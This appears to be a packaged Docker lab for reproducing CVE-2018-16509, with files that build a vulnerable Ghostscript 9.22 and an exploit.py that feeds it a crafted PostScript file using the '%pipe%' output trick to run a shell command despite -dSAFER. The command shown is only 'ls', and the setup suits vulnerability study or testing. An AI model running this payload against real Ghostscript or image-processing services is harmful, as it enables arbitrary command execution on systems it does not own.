{
    "files": [
        {
            "location": "./../../dockers/CVE-2018-16509/custom_no_tool/docker-compose.yml",
            "content": "version: '3.7'\n\nservices:\n  ghostscript:\n    build: ./ghostscript\n    container_name: ghostscript_vulnerable\n    networks:\n      - gs_network\n    ports:\n      - \"4711:4711\"\n    command: [\"gs\", \"-q\", \"-dNOPAUSE\", \"-dBATCH\", \"-dSAFER\", \"-c\", \"quit\"]\n\n  python_app:\n    build: ./python_app\n    container_name: python_app\n    depends_on:\n      - ghostscript\n    volumes:\n      - ./scripts:/scripts\n    command: python /scripts/exploit.py\n    networks:\n      - gs_network\n\nnetworks:\n  gs_network:\n    driver: bridge\n"
        },
        {
            "location": "./../../dockers/CVE-2018-16509/custom_no_tool/ghostscript/Dockerfile",
            "content": "FROM debian:stretch-slim\n\nRUN echo \"deb http://archive.debian.org/debian stretch main\" > /etc/apt/sources.list \\\n    && echo \"deb http://archive.debian.org/debian-security stretch/updates main\" >> /etc/apt/sources.list \\\n    && apt-get update -o Acquire::Check-Valid-Until=false \\\n    && apt-get install -y \\\n    wget \\\n    build-essential \\\n    libjpeg-dev \\\n    libpng-dev \\\n    && rm -rf /var/lib/apt/lists/*\n\nWORKDIR /usr/src/ghostscript\n\nRUN wget https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs922/ghostscript-9.22.tar.gz \\\n    && tar -xzf ghostscript-9.22.tar.gz \\\n    && cd ghostscript-9.22 \\\n    && ./configure \\\n    && make \\\n    && make install\n\nCMD [\"gs\", \"-q\", \"-dNOPAUSE\", \"-dBATCH\", \"-dSAFER\", \"-c\", \"quit\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2018-16509/custom_no_tool/python_app/Dockerfile",
            "content": "FROM python:3.6-slim\n\nRUN apt-get update && \\\n    apt-get install -y \\\n    gcc \\\n    libjpeg-dev \\\n    zlib1g-dev \\\n    ghostscript \\\n    && rm -rf /var/lib/apt/lists/*\n\nRUN pip install pillow==5.2.0\n\nWORKDIR /scripts\n\nCMD [\"python\", \"/scripts/exploit.py\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2018-16509/custom_no_tool/scripts/exploit.py",
            "content": "from PIL import Image\nimport subprocess\nimport os\n\n# Crafting a malicious PostScript file that will trigger the vulnerability\nmalicious_ps = '''\n%!PS\nuserdict /setpagedevice undef\n(\n  /OutputFile (%pipe%ls) (w) file\n) stopped pop\n'''\n\nwith open('/scripts/malicious.ps', 'w') as f:\n    f.write(malicious_ps)\n\n# Attempt to process the malicious PostScript file using Ghostscript\ntry:\n    # Explicitly call Ghostscript via subprocess\n    result = subprocess.run(['gs', '-dNOPAUSE', '-dBATCH', '-dSAFER', '-sDEVICE=pdfwrite', '-o', '/dev/null', '/scripts/malicious.ps'],\n                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    print(\"Ghostscript output:\", result.stdout.decode())\n    print(\"Ghostscript errors:\", result.stderr.decode())\nexcept Exception as e:\n    print(\"Exploit failed:\", e)\n\n# Check if the exploit was successful by listing files\nos.system('ls')\n"
        }
    ],
    "directory_tree": "CVE-2018-16509/\n\u2514\u2500\u2500 custom_no_tool/\n    \u251c\u2500\u2500 docker-compose.yml\n    \u251c\u2500\u2500 ghostscript/\n    \u2502   \u2514\u2500\u2500 Dockerfile\n    \u251c\u2500\u2500 python_app/\n    \u2502   \u2514\u2500\u2500 Dockerfile\n    \u2514\u2500\u2500 scripts/\n        \u2514\u2500\u2500 exploit.py\n"
}